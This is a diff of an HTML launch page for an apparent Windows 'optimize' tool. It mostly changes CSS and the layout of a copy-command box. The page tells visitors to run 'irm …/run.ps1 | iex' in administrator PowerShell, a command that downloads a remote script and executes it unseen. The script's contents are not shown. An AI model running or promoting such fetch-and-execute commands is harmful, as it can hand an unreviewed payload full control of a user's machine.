@@ -60,21 +60,17 @@
             position: relative;
         }
 
-        .command-wrapper {
-            position: relative;
-            margin-top: 15px;
-        }
-
         .command {
             background-color: var(--color-bg-secondary);
             border: 1px solid var(--color-border);
             color: var(--color-text-primary);
             font-family: 'SFMono-Regular', Consolas, 'Liberation Mono', Menlo, monospace;
-            padding: 10px 40px 10px 10px;
+            padding: 10px;
+            margin-top: 15px;
             border-radius: 6px;
             text-align: center;
             word-break: break-all;
-            width: 100%;
+            position: relative;
         }
 
         .footer {
@@ -117,7 +113,6 @@
             color: var(--color-text-secondary);
             cursor: pointer;
             transition: color 0.3s ease;
-            z-index: 10;
         }
 
         .copy-btn:hover {
@@ -143,10 +138,8 @@
             <h2 id="instruction-title" style="color: var(--color-accent); margin-bottom: 15px;">Launch Instructions</h2>
             <p id="instruction-text" style="color: var(--color-text-secondary); margin-bottom: 15px;">Run the following command in PowerShell with administrator rights:</p>
             
-            <div class="command-wrapper">
-                <div class="command" id="command-container">
-                    irm https://sublimatetheberry.github.io/letsoptimize110/run.ps1 | iex
-                </div>
+            <div class="command" id="command-container">
+                irm https://sublimatetheberry.github.io/letsoptimize110/run.ps1 | iex
                 <button class="copy-btn" id="copy-btn" aria-label="Copy command">
                     <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                         <rect x="9" y="9" width="13" height="13" rx="2" ry="2"></rect>
